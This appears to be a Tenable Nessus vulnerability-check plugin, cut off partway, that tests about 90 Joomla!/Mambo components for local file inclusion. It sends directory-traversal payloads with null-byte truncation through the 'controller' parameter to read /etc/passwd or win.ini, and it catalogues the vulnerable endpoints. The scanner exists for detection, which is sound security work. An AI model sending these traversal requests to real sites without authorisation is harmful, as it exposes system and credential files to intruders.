#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(43636);
  script_version("$Revision: 1.156 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id(
    "CVE-2010-0157",
    "CVE-2010-0467",
    "CVE-2010-0676",
    "CVE-2010-0944",
    "CVE-2010-0972",
    "CVE-2010-1056",
    "CVE-2010-1081",
    "CVE-2010-1304",
    "CVE-2010-1305",
    "CVE-2010-1306",
    "CVE-2010-1308",
    "CVE-2010-1312",
    "CVE-2010-1314",
    "CVE-2010-1340",
    "CVE-2010-1345",
    "CVE-2010-1352",
    "CVE-2010-1354",
    "CVE-2010-1469",
    "CVE-2010-1470",
    "CVE-2010-1471",
    "CVE-2010-1472",
    "CVE-2010-1473",
    "CVE-2010-1474",
    "CVE-2010-1475",
    "CVE-2010-1478",
    "CVE-2010-1491",
    "CVE-2010-1494",
    "CVE-2010-1534",
    "CVE-2010-1602",
    "CVE-2010-1607",
    "CVE-2010-1653",
    "CVE-2010-1658",
    "CVE-2010-1714",
    "CVE-2010-1715",
    "CVE-2010-1717",
    "CVE-2010-1718",
    "CVE-2010-1719",
    "CVE-2010-1722",
    "CVE-2010-1723",
    "CVE-2010-1858",
    "CVE-2010-1875",
    "CVE-2010-1878",
    "CVE-2010-1952",
    "CVE-2010-1953",
    "CVE-2010-1954",
    "CVE-2010-1956",
    "CVE-2010-1979",
    "CVE-2010-1980",
    "CVE-2010-1981",
    "CVE-2010-2033",
    "CVE-2010-2034",
    "CVE-2010-2035",
    "CVE-2010-2036",
    "CVE-2010-2037",
    "CVE-2010-2050",
    "CVE-2010-2122",
    "CVE-2010-2507",
    "CVE-2010-3426",
    "CVE-2010-4977",
    "CVE-2011-4804"
  );
  script_bugtraq_id(
    37583,
    37596,
    37691,
    37987,
    38267,
    38330,
    38715,
    38741,
    38742,
    38743,
    38747,
    38749,
    38751,
    38761,
    38783,
    38911,
    38912,
    38917,
    39174,
    39176,
    39177,
    39178,
    39200,
    39203,
    39208,
    39213,
    39214,
    39222,
    39239,
    39246,
    39248,
    39251,
    39266,
    39267,
    39331,
    39342,
    39383,
    39385,
    39386,
    39387,
    39388,
    39390,
    39398,
    39399,
    39497,
    39506,
    39509,
    39545,
    39547,
    39548,
    39560,
    39562,
    39566,
    39606,
    39607,
    39608,
    39742,
    39743,
    40175,
    40176,
    40177,
    40185,
    40192,
    40244,
    40328,
    40412,
    40440,
    40964,
    41031,
    41358,
    42486,
    43147,
    43820,
    46081,
    48345,
    48944,
    56994
  );
  script_osvdb_id(
    61457,
    62000,
    62390,
    62506,
    62826,
    62927,
    62928,
    62929,
    62930,
    62966,
    62968,
    62972,
    63031,
    63143,
    63147,
    63154,
    63532,
    63536,
    63556,
    63562,
    63572,
    63577,
    63578,
    63579,
    63580,
    63581,
    63586,
    63587,
    63642,
    63656,
    63658,
    63659,
    63660,
    63662,
    63663,
    63664,
    63665,
    63666,
    63671,
    63674,
    63675,
    63676,
    63678,
    63679,
    63680,
    63806,
    63914,
    63915,
    63916,
    63917,
    63941,
    63943,
    63974,
    63976,
    63979,
    63989,
    64099,
    64102,
    64247,
    64593,
    64743,
    64758,
    64820,
    64920,
    64921,
    64922,
    64923,
    64931,
    64969,
    65674,
    66031,
    67282,
    68113,
    70738,
    77157,
    88619,
    94665
  );
  script_xref(name:"EDB-ID", value:"10928");
  script_xref(name:"EDB-ID", value:"10943");
  script_xref(name:"EDB-ID", value:"11088");
  script_xref(name:"EDB-ID", value:"11277");
  script_xref(name:"EDB-ID", value:"11282");
  script_xref(name:"EDB-ID", value:"11707");
  script_xref(name:"EDB-ID", value:"11738");
  script_xref(name:"EDB-ID", value:"11740");
  script_xref(name:"EDB-ID", value:"11743");
  script_xref(name:"EDB-ID", value:"11756");
  script_xref(name:"EDB-ID", value:"11758");
  script_xref(name:"EDB-ID", value:"11759");
  script_xref(name:"EDB-ID", value:"11760");
  script_xref(name:"EDB-ID", value:"11785");
  script_xref(name:"EDB-ID", value:"11851");
  script_xref(name:"EDB-ID", value:"11853");
  script_xref(name:"EDB-ID", value:"11996");
  script_xref(name:"EDB-ID", value:"11997");
  script_xref(name:"EDB-ID", value:"11998");
  script_xref(name:"EDB-ID", value:"12058");
  script_xref(name:"EDB-ID", value:"12065");
  script_xref(name:"EDB-ID", value:"12066");
  script_xref(name:"EDB-ID", value:"12067");
  script_xref(name:"EDB-ID", value:"12069");
  script_xref(name:"EDB-ID", value:"12077");
  script_xref(name:"EDB-ID", value:"12084");
  script_xref(name:"EDB-ID", value:"12085");
  script_xref(name:"EDB-ID", value:"12086");
  script_xref(name:"EDB-ID", value:"12087");
  script_xref(name:"EDB-ID", value:"12088");
  script_xref(name:"EDB-ID", value:"12101");
  script_xref(name:"EDB-ID", value:"12102");
  script_xref(name:"EDB-ID", value:"12111");
  script_xref(name:"EDB-ID", value:"12113");
  script_xref(name:"EDB-ID", value:"12142");
  script_xref(name:"EDB-ID", value:"12145");
  script_xref(name:"EDB-ID", value:"12146");
  script_xref(name:"EDB-ID", value:"12147");
  script_xref(name:"EDB-ID", value:"12149");
  script_xref(name:"EDB-ID", value:"12151");
  script_xref(name:"EDB-ID", value:"12166");
  script_xref(name:"EDB-ID", value:"12167");
  script_xref(name:"EDB-ID", value:"12168");
  script_xref(name:"EDB-ID", value:"12169");
  script_xref(name:"EDB-ID", value:"12170");
  script_xref(name:"EDB-ID", value:"12171");
  script_xref(name:"EDB-ID", value:"12172");
  script_xref(name:"EDB-ID", value:"12173");
  script_xref(name:"EDB-ID", value:"12174");
  script_xref(name:"EDB-ID", value:"12175");
  script_xref(name:"EDB-ID", value:"12176");
  script_xref(name:"EDB-ID", value:"12177");
  script_xref(name:"EDB-ID", value:"12178");
  script_xref(name:"EDB-ID", value:"12180");
  script_xref(name:"EDB-ID", value:"12181");
  script_xref(name:"EDB-ID", value:"12182");
  script_xref(name:"EDB-ID", value:"12230");
  script_xref(name:"EDB-ID", value:"12233");
  script_xref(name:"EDB-ID", value:"12239");
  script_xref(name:"EDB-ID", value:"12282");
  script_xref(name:"EDB-ID", value:"12283");
  script_xref(name:"EDB-ID", value:"12285");
  script_xref(name:"EDB-ID", value:"12287");
  script_xref(name:"EDB-ID", value:"12288");
  script_xref(name:"EDB-ID", value:"12289");
  script_xref(name:"EDB-ID", value:"12290");
  script_xref(name:"EDB-ID", value:"12291");
  script_xref(name:"EDB-ID", value:"12316");
  script_xref(name:"EDB-ID", value:"12317");
  script_xref(name:"EDB-ID", value:"12318");
  script_xref(name:"EDB-ID", value:"12427");
  script_xref(name:"EDB-ID", value:"12430");
  script_xref(name:"EDB-ID", value:"12611");
  script_xref(name:"EDB-ID", value:"12618");
  script_xref(name:"EDB-ID", value:"12769");
  script_xref(name:"EDB-ID", value:"12814");
  script_xref(name:"EDB-ID", value:"13924");
  script_xref(name:"EDB-ID", value:"13981");
  script_xref(name:"EDB-ID", value:"14656");
  script_xref(name:"EDB-ID", value:"14964");
  script_xref(name:"EDB-ID", value:"17411");

  script_name(english:"Joomla! / Mambo Component Multiple Parameter Local File Include Vulnerabilities");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple local file include vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The remote host contains a component for Joomla! or Mambo that fails
to sanitize user-supplied input to multiple parameters in a GET
request before using it to include PHP code. Regardless of the PHP
'register_globals' setting, an unauthenticated, remote attacker can
exploit this issue to disclose arbitrary files or possibly execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user ID.");
  script_set_attribute(attribute:"solution", value:
"Contact the vendor of each affected component to see if an upgrade is
available or else disable it.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Joomla Component com_shoutbox LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_cwe_id(22);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/01/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/01/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2017 Tenable Network Security, Inc.");

  script_dependencies("mambo_detect.nasl", "joomla_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);
app = "Mambo / Joomla!";

# Generate a list of paths to check.
mambo = get_dirs_from_kb(appname:'mambo_mos', port:port);
if (isnull(mambo)) mambo = make_list();

joomla = make_list();
joomla_installs = get_installs(
  app_name : "Joomla!",
  port     : port
);

if (joomla_installs[0] == IF_OK)
{
  foreach install (joomla_installs[1])
  {
    dir = install['path'];
    joomla = make_list(dir, joomla);
  }
}

dirs = make_list(mambo, joomla);
if (max_index(dirs) == 0)
  audit(AUDIT_WEB_APP_NOT_INST, app, port);

# Vulnerable components.
ncoms = 0;
com = make_array();
pat = make_array();                     # regexes so we're sure the component is installed.

# - A Cool Debate (Bugtraq 48345 / EDB-ID 17411)
com[ncoms] = "/index.php?option=com_acooldebate";
pat[ncoms] = 'class="mainDebateWrapper"';
ncoms++;
# - AddressBook (Bugtraq 39398 / EDB-ID 12170)
com[ncoms] = "/index.php?option=com_addressbook";
pat[ncoms] = 'Messege Could Not';
ncoms++;
# - ArcadeGames (Bugtraq 39398 / EDB-ID 12168)
com[ncoms] = "/index.php?option=com_arcadegames";
pat[ncoms] = '<iframe id="ArcadeGames"';
ncoms++;
# - Archery Scores (Bugtraq 39545 / EDB-ID 12282)
com[ncoms] = "/index.php?option=com_archeryscores";
pat[ncoms] = 'archeryscoresView';
ncoms++;
# - AWDwall (Bugtraq 39331 / EDB-ID 12113)
#   untested but confirmed at <http://www.awdwall.com/index.php/awdwall-updates-logs->.
com[ncoms] = "/index.php?option=com_awdwall";
pat[ncoms] = 'com_awdwall/views/awdwall/tmpl/';
ncoms++;
# - aWiki (Bugtraq 39267 / EDB-ID 12101)
com[ncoms] = "/index.php?option=com_awiki";
pat[ncoms] = "awikiView";
ncoms++;
# - BeeHeard (Bugtraq 39506 / EDB-ID 12239)
com[ncoms] = "/index.php?option=com_beeheard";
pat[ncoms] = 'beeheardView';
ncoms++;
com[ncoms] = "/index.php?option=com_beeheardlite";
pat[ncoms] = 'beeheardliteView';
ncoms++;
# - Bible Study (Bugtraq 37583)
com[ncoms] = "/index.php?option=com_biblestudy&id=1&view=studieslist";
pat[ncoms] = "js/biblestudy\.js";
ncoms++;
# - BCA-RSS-Syndicator (Bugtraq 39208)
com[ncoms] = "/index.php?option=com_bca-rss-syndicator";
pat[ncoms] = '<generator>FeedCreator';
ncoms++;
# - Boy Scout Adventure (Bugtraq 43820)
com[ncoms] = "/index.php?option=com_bsadv";
pat[ncoms] = 'controller=scoutranks|Scout Records';
ncoms++;
# - Canteen (Bugtraq 41358)
com[ncoms] = "/index.php?option=com_canteen";
pat[ncoms] = 'canteenView';
ncoms++;
# - ccNewsletter (Bugtraq 37987 and Exploit DB 11282)
#   Fixed in 1.0.6 per http://www.chillcreations.com/en/blog/ccnewsletter-joomla-newsletter/ccnewsletter-106-security-release.html
com[ncoms] = "/index.php?option=com_ccnewsletter&view=ccnewsletter";
pat[ncoms] = 'form action=.+ name="subscribeForm"';
ncoms++;
com[ncoms] = "/index.php?option=com_ccnewsletter";
pat[ncoms] = 'form action=.+ name="subscribeForm"';
ncoms++;
# - CKForms (Bugtraq 38783)
com[ncoms] = "/index.php?option=com_ckforms";
pat[ncoms] = "com_ckforms/js/ui.datepicker.packed.js";
ncoms++;
# - Community Polls (Bugtraq 38330)
com[ncoms] = "/index.php?option=com_communitypolls";
pat[ncoms] = "";
ncoms++;
# - CV Maker (Bugtraq 39398 / EDB-ID 12172)
com[ncoms] = "/index.php?option=com_cvmaker";
pat[ncoms] = '<b>User Must Be Logged In</b>';
ncoms++;
# - Daily Meals (Bugtraq 37596)
com[ncoms] = "/index.php?option=com_dailymeals";
pat[ncoms] = '<div id="dailymeals">';
ncoms++;
# - Datafeeds (Bugtraq 39246 / EDB-ID 12088)
com[ncoms] = "/index.php?option=com_datafeeds";
pat[ncoms] = '';
ncoms++;
# - Digital Diary (Bugtraq 39398 / EDB-ID 12178)
com[ncoms] = "/index.php?option=com_diary";
pat[ncoms] = "value='Diary' />";
ncoms++;
# - Draw Root Map (Bugtraq 39562 / EDB-ID 12289)
com[ncoms] = "/index.php?option=com_drawroot";
pat[ncoms] = 'drawRoute\\(\\)';
ncoms++;
# - Easy Ad Banner (EDB-ID 12171)
com[ncoms] = "/index.php?option=com_advertising";
pat[ncoms] = '';
ncoms++;
# - EContent (Bugtraq 39176)
#
# nb: we can only test based on PHP error messages.
com[ncoms] = "/index.php?option=com_econtent";
pat[ncoms] = "";
ncoms++;
# - Fabrik (Bugtraq 40328 / EDB-ID 12087)
com[ncoms] = "/index.php?option=com_fabrik";
pat[ncoms] = "com_fabrik/libs/mootools-ext\.js";
ncoms++;
# - FlashGames (Bugtraq 39398 / EDB-ID 12169)
com[ncoms] = "/index.php?option=com_flashgames";
pat[ncoms] = 'Messege Could Not';
ncoms++;
# - Frontend User Access (Bugtraq 46081)
com[ncoms] = "/index.php?option=com_frontenduseraccess";
pat[ncoms] = 'you have no access to this page<br';
ncoms++;
# - G2Bridge (Bugtraq 40440/ EDB-ID 12814)
com[ncoms] = "/index.php?option=com_g2bridge";
pat[ncoms] = '';
ncoms++;
# - Gadget Factory (Bugtraq 39547 / EDB-ID 12285)
com[ncoms] = "/index.php?option=com_gadgetfactory";
pat[ncoms] = '"status":0,"message":"Wrong credentials"';
ncoms++;
# - Gallery XML (Bugtraq 40964)
com[ncoms] = "/index.php?option=com_galleryxml";
pat[ncoms] = 'galpic.+catpics.+gcatid';
ncoms++;
# - GAnalytics (Bugtraq 38749)
com[ncoms] = "/index.php?option=com_ganalytics";
pat[ncoms] = '';
ncoms++;
# - GCalendar (Bugtraq 38742)
com[ncoms] = "/index.php?option=com_gcalendar";
pat[ncoms] = '(gcalendar_powered|There is no calendar specified.+Parameter Basic)';
ncoms++;
# - Google Map (Bugtraq 39560 / EDB-ID 12290)
com[ncoms] = "/index.php?option=com_google";
pat[ncoms] = '#google_map';
ncoms++;
# - Graphics (BID 39743 / EDB-ID 12430)
com[ncoms] = "/index.php?option=com_graphics";
pat[ncoms] = 'GraphicsControllerGraphics';
ncoms++;
# - Highslide JS Configuration (Bugtraq 39239 / EDB-ID 12086)
com[ncoms] = "/index.php?option=com_hsconfig";
pat[ncoms] = '';
ncoms++;
# - Horoscope (Bugtraq 39398 / EDB-ID 12167)
com[ncoms] = "/index.php?option=com_horoscope";
pat[ncoms] = 'Messege Could Not';
ncoms++;
# - iF surfALERT (Bugtraq 39566 / EDB-ID 12291)
com[ncoms] = "/index.php?option=com_if_surfalert";
pat[ncoms] = '<!-- SURF REPORT';
ncoms++;
# - JCollection (Bugtraq 37691)
com[ncoms] = "/index.php?option=com_jcollection";
pat[ncoms] = 'jcollectionView';
ncoms++;
# - Jfeedback (Bugtraq 39390 / EDB-ID 12145)
com[ncoms] = "/index.php?option=com_jfeedback";
pat[ncoms] = '';
ncoms++;
# - JGrid (Bugtraq 42486 / EDB-ID 14656)
com[ncoms] = "/index.php?option=com_jgrid";
pat[ncoms] = 'var jgrid_(columns|store)';
ncoms++;
# - JInventory (Bugtraq 39203)
#   untested but confirmed at <http://extensions.joomla.org/extensions/e-commerce/shopping-cart/7951>.
com[ncoms] = "/index.php?option=com_jinventory";
pat[ncoms] = 'jinventoryView';
ncoms++;
# - Joomla! Flickr (Bugtraq 39251 / EDB-ID 12085)
com[ncoms] = "/index.php?option=com_joomlaflickr";
pat[ncoms] = 'joomlaflickrView';
ncoms++;
# - Joomla! Picasa (Bugtraq 39200)
com[ncoms] = "/index.php?option=com_joomlapicasa2";
pat[ncoms] = 'joomlapicasa2View';
ncoms++;
# - JoomMail (Bugtraq 39398 / EDB-ID 12175)
com[ncoms] = "/index.php?option=com_joommail";
pat[ncoms] = "<center><b>User must be logged in</b>";
ncoms++;
# - jPhone (Bugtraq 43147 / EDB-ID 14964)
com[ncoms] = "/index.php?option=com_jphone";
pat[ncoms] = '<h1>jPhone</h1>|jQTouch';
ncoms++;
# - JProject Manager (Bugtraq 39383 / EDB-ID 12146)
com[ncoms] = "/index.php?option=com_jprojectmanager";
pat[ncoms] = '';
ncoms++;
# - JResearch (Bugtraq 38917)
com[ncoms] = "/index.php?option=com_jresearch";
pat[ncoms] = '(<title>Research Areas</title>|css/jresearch_styles\\.css")';
ncoms++;
# - Jukebox (Bugtraq 39248 / EDB-ID 12084)
#   nb: version 1.0 is definitely affected; 1.7 doesn't seem to be
#       although the advisory posted on Exploit DB claims otherwise.
com[ncoms] = "/index.php?option=com_jukebox";
pat[ncoms] = '(com_jukebox/unitip/images|class="jukeboxintro")';
ncoms++;
# - Julia Portfolio (Bugtraq 38715)
com[ncoms] = "/index.php?option=com_juliaportfolio";
pat[ncoms] = '<table class="portfolio">';
ncoms++;
# - Jvehicles (Bugtraq 39177)
com[ncoms] = "/index.php?option=com_jvehicles";
pat[ncoms] = 'com_jvehicles/includes/js/config\\.js';
ncoms++;
# - Linkr (Bugtraq 38747)
com[ncoms] = "/index.php?option=com_linkr";
pat[ncoms] = 'LinkrHelper=new LinkrAPI';
ncoms++;
# - MediQnA (Bugtraq 40412 / EDB-ID 12769)
com[ncoms] = "/index.php?option=com_mediqna";
pat[ncoms] = '(<h3>Question Sets\\.+</h3>|Click .+view=listing">here</a> to view other sets)';
ncoms++;
# - Memory Book (Bugtraq 39398 / EDB-ID 12176)
com[ncoms] = "/index.php?option=com_memory";
pat[ncoms] = "value='viewAddMemoryPage'";
ncoms++;
# - MMS Blog (Bugtraq 39607 / EDB-ID 12318)
com[ncoms] = "/index.php?option=com_mmsblog";
pat[ncoms] = 'Powered by .+MMS Blog';
ncoms++;
# - MS Comment (Bugtraq 40185 / EDB-ID 12611)
com[ncoms] = "/index.php?option=com_mscomment";
pat[ncoms] = 'class="modifydate" onclick="hideComments\\(';
ncoms++;
# - MT Fire Eagle (Bugtraq 39509 / EDB-ID 12233)
com[ncoms] = "/index.php?option=com_mtfireeagle";
pat[ncoms] = "mtfireeagleView";
ncoms++;
# - Multiple Map (Bugtraq 39551 / EDB-ID 12289)
com[ncoms] = "/index.php?option=com_multimap";
pat[ncoms] = 'GSmallMapControl\\(\\)';
ncoms++;
# - Multiple Root (Bugtraq 39552 / EDB-ID 12287)
com[ncoms] = "/index.php?option=com_multiroot";
pat[ncoms] = 'function createMarker';
ncoms++;
# - My Files (Bugtraq 39398 / EDB-ID 12173)
com[ncoms] = "/index.php?option=com_myfiles";
pat[ncoms] = '<strong>No Files Uploaded</strong>';
ncoms++;
# - Ninja RSS Syndicator (Exploit DB 11740)
com[ncoms] = "/index.php?option=com_ninjarsssyndicator";
pat[ncoms] = '<generator>FeedCreator';
ncoms++;
# - News Portal (BID 39222 / EDB-ID 12077)
#   untested but confirmed at <http://www.ijoomla.com/ijoomla-news-portal/ijoomla-news-portal/index/> (Changelog for version 1.5.9).
com[ncoms] = "/index.php?option=com_news_portal";
pat[ncoms] = '(com_news_portal/news\\.css|com_news_portal/helpers/news\\.css)';
ncoms++;
# - NoticeBoard (BID 39742 / EDB-ID 12427)
com[ncoms] = "/index.php?option=com_noticeboard";
pat[ncoms] = 'id="NoticeBoard';
ncoms++;
# - obSuggest (BID 48944)
com[ncoms] = "/index.php?option=com_obsuggest";
pat[ncoms] = '';
ncoms++;
# - Online Exam (Bugtraq 39398 / EDB-ID 12174)
com[ncoms] = "/index.php?option=com_onlineexam";
pat[ncoms] = '^USER MUST BE LOGGED IN';
ncoms++;
# - Online Market (Bugtraq 39398 / EDB-ID 12177)
com[ncoms] = "/index.php?option=com_market";
pat[ncoms] = '^Messege Could Not';
ncoms++;
# - OrgChart (Bugtraq 39606 / EDB-ID 12317)
com[ncoms] = "/index.php?option=com_orgchart";
pat[ncoms] = 'default view of the Org Chart component';
ncoms++;
# - Percha Categories Tree (Bugtraq 40244)
com[ncoms] = "/index.php?option=com_perchacategoriestree";
pat[ncoms] = '';
ncoms++;
# - Percha Downloads Attach (Bugtraq 40244)
com[ncoms] = "/index.php?option=com_perchadownloadsattach";
pat[ncoms] = 'perchadownloadsattachView';
ncoms++;
# - Percha Fields Attach (Bugtraq 40244)
com[ncoms] = "/index.php?option=com_perchafieldsattach";
pat[ncoms] = 'perchafieldsattachView';
ncoms++;
# - Percha Gallery (Bugtraq 40244)
com[ncoms] = "/index.php?option=com_perchagallery";
pat[ncoms] = 'perchagalleryView';
ncoms++;
# - Percha Image Attach (Bugtraq 40244)
com[ncoms] = "/index.php?option=com_perchaimageattach";
pat[ncoms] = 'perchaimageattachView';
ncoms++;
# - Picasa2Gallery (Bugtraq 41031 / EDB-ID 13981)
com[ncoms] = "/index.php?option=com_picasa2gallery";
pat[ncoms] = 'picasa2galleryView';
ncoms++;
# - Preventive and Reservation (Bugtraq 39387 / EDB-ID 12147)
com[ncoms] = "/index.php?option=com_preventive";
pat[ncoms] = '(Preventive and reservation creator|name="arrival" id="publish_up1")';
ncoms++;
# - Properties (Bugtraq 38912)
com[ncoms] = "/index.php?option=com_properties";
pat[ncoms] = '(" content="Properties" />|<div id="propiedades")';
ncoms++;
# - Record (Bugtraq 39398 / EDB-ID 12181)
com[ncoms] = "/index.php?option=com_record";
pat[ncoms] = '>500 - Layout "';
ncoms++;
# - RokDownloads (Bugtraq 38741)
com[ncoms] = "/index.php?option=com_rokdownloads";
pat[ncoms] = '';
ncoms++;
# - RWCards (Bugtraq 38267)
com[ncoms] = "/index.php?option=com_rwcards";
pat[ncoms] = 'rwcards\\.slideshow\\.css|id="rwcardsTable"';
ncoms++;
# - SectionEx (Bugtraq 38751)
com[ncoms] = "/index.php?option=com_sectionex";
pat[ncoms] = 'sectionexView';
ncoms++;
# - Shoutbox (Bugtraq 39213 / EDB-ID 12067)
#   untested but confirmed at <http://joomla.batjo.nl/news/23-security-release-shoutbox-archive-component..html>.
com[ncoms] = "/index.php?option=com_shoutbox";
pat[ncoms] = '>Shoutbox Archive<';
ncoms++;
# - SimpleDownload (Bugtraq 40192 / EDB-ID 12618)
com[ncoms] = "/index.php?option=com_simpledownload";
pat[ncoms] = '';
ncoms++;
# - SMEStorage (Bugtraq 38911)
com[ncoms] = "/index.php?option=com_smestorage";
pat[ncoms] = '(css/smestorage\\.css|div id="smestorage_div")';
ncoms++;
# - spsNewsletter (Bugtraq 39388 / EDB-ID 12149)
com[ncoms] = "/index.php?option=com_spsnewsletter";
pat[ncoms] = 'value="addSubscriber"';
ncoms++;
# - SVMap (Bugtraq 39214)
com[ncoms] = "/index.php?option=com_svmap";
pat[ncoms] = '(com_svmap/svmap\\.css|svmap_canvas)';
ncoms++;
# - Sweety Keeper (Bugtraq 39399 / EDB-ID 12182)
com[ncoms] = "/index.php?option=com_sweetykeeper";
pat[ncoms] = '(<h1>Sweety Keeper Component</h1>|views/sweetykeeper/)';
ncoms++;
# - Travelbook (Bugtraq 39385 / EDB-ID 12151)
com[ncoms] = "/index.php?option=com_travelbook";
pat[ncoms] = '';
ncoms++;
# - TweetLA (Bugtraq 39386 / EDB-ID 12142)
com[ncoms] = "/index.php?option=com_tweetla";
pat[ncoms] = '';
ncoms++;
# - Ulti RPX (Bugtraq 38743)
com[ncoms] = "/index.php?option=com_rpx";
pat[ncoms] = '';
ncoms++;
# - User Status (BID 39174)
#   untested but confirmed at <http://extensions.joomla.org/extensions/communities-a-groupware/members-lists/11740>.
com[ncoms] = "/index.php?option=com_userstatus";
pat[ncoms] = '(userstatus_detail|com_userstatus/images)';
ncoms++;
# - Vjdeo (Bugtraq 39266 / EDB-ID 12101)
com[ncoms] = "/index.php?option=com_vjdeo";
pat[ncoms] = 'vjdeoView';
ncoms++;
# - Webee Comment (Bugtraq 39342 / EDB-ID 12111)
com[ncoms] = "/index.php?option=com_webeecomment";
pat[ncoms] = 'onclick="addComments\\(';
ncoms++;
# - webERPcustomer (BID 39178)
#   untested but confirmed at <http://extensions.joomla.org/extensions/bridges/crm-bridges/8754>.
com[ncoms] = "/index.php?option=com_weberpcustomer";
pat[ncoms] = '';
ncoms++;
# - WebTV (Bugtraq 39398 / EDB-ID 12166)
com[ncoms] = "/index.php?option=com_webtv";
pat[ncoms] = '^Messege Could Not';
ncoms++;
# - wgPicasa (Bugtraq 39497 / EDB-ID 12230)
com[ncoms] = "/index.php?option=com_wgpicasa";
pat[ncoms] = 'wgpicasaView';
ncoms++;
# - WMI (Web Merchant Interface) (Bugtraq 39608 / EDB-ID 12316)
com[ncoms] = "/index.php?option=com_wmi";
pat[ncoms] = 'WebMoney Transfer';
ncoms++;
# - World Rates (Bugtraq 39398 / EDB-ID 12180)
com[ncoms] = "/index.php?option=com_worldrates";
pat[ncoms] = ">World's Currency Rates<";
ncoms++;
# - ZiMB Comment (Bugtraq 39548 / EDB-ID 12283)
com[ncoms] = "/index.php?option=com_zimbcomment";
pat[ncoms] = 'onclick="hideComments\\(';
ncoms++;
# - ZTAutolink (Bugtraq 56994)
com[ncoms] = "/index.php?option=com_ztautolink";
pat[ncoms] = '<h1> </h1>';
ncoms++;

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini','/winnt/win.ini');
  else
    files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini', 'LICENSE.php');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['LICENSE.php'] = "GNU GENERAL PUBLIC LICENSE";

# Loop through each directory.
contents = "";
found_file = "";
info = "";
non_affect = make_list();

foreach dir (list_uniq(dirs))
{
  for (i=0; i<ncoms; i++)
  {
    foreach file (files)
    {
      # Once we find a file that works, stick with it for any subsequent tests.
      if (found_file && file != found_file) continue;

      #  we can't test some components properly because execution errors
      #  out if the required file doesn't result in a valid class. So
      #  we'll fudge the filename and hope PHP displays errors.
      if (
        "com_econtent" >< com[i] ||
        "com_perchadownloadsattach" >< com[i] ||
        "com_perchafieldsattach" >< com[i] ||
        "com_perchagallery" >< com[i] ||
        "com_perchaimageattach" >< com[i] ||
        "com_record" >< com[i]
      )
      {
        alt_file = substr(file, 0, strlen(file)-2);
        file_pats[alt_file] = file_pats[file];
        file = alt_file;
      }

      if (file[0] == '/') traversal = crap(data:"../", length:3*9) + '..';
      else traversal = '../../../';
      if (com_fabrik >!< com[i]) traversal = '/' + traversal;

      if (substr(file, strlen(file)-4) == ".php")
        exploit = traversal + substr(file, 0, strlen(file)-4-1);
      else
        exploit = traversal + file + "%00";

      url = dir + com[i] + "&controller=" + exploit;
      res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);

      # There's a problem if...
      body = res[2];
      file_pat = file_pats[file];
      if (
        # we see the expected contents or...
        egrep(pattern:file_pat, string:body) ||
        # we get an error because magic_quotes was enabled or...
        traversal+file+".php" >< body ||
        # we get an error claiming the file doesn't exist or...
        file+"): failed to open stream: No such file" >< body ||
        file+") [function.require-once]: failed to open stream: No such file" >< body ||
        file+") [<a href='function.require-once'>function.require-once</a>]: failed to open stream: No such file" >< body ||
        # we get an error about open_basedir restriction.
        file+") [function.require-once]: failed to open stream: Operation not permitted" >< body ||
        file+") [<a href='function.require-once'>function.require-once</a>]: failed to open stream: Operation not permitted" >< body ||
        "open_basedir restriction in effect. File("+traversal+file >< body
      )
      {
        # Make sure it's the affected component unless we're paranoid or we can't.
        if (report_paranoia < 2 && pat[i])
        {
          url2 = dir + com[i];
          res2 = http_send_recv3(port:port, method:"GET", item:url2, exit_on_fail:TRUE);

          if (!egrep(pattern:pat[i], string:res2[2])) break;
        }

        info += "  - " + build_url(port:port, qs:url) + '\n';

        if (!contents && egrep(pattern:file_pat, string:body))
        {
          found_file = file;

          if (ereg(pattern:"_(addressbook|arcadegames|cvmaker|diary|flashgames|horoscope|joommail|market|memory|myfiles|onlineexam|orgchart|webtv|worldrates)$", string:com[i]))
          {
            contents = strstr(body, '<table class="nopad"') - '<table class="nopad"';
            contents = contents - strstr(contents, '<div id');
            contents = contents - strstr(contents, '<h2><center><b>User must be logged in</b>');
            contents = contents - strstr(contents, '<style ');
            contents = contents - strstr(contents, 'USER MUST BE LOGGED IN');
            contents = contents - strstr(contents, '\n<html>');
            contents = contents - strstr(contents, '\t\t<table ');
            contents = contents - strstr(contents, '<table ');
            contents = contents - strstr(contents, '\n<!-- Deafult');
            contents = ereg_replace(pattern:'^.+<td>[ \\t\\n\\r]*', replace:'', string:contents);
          }
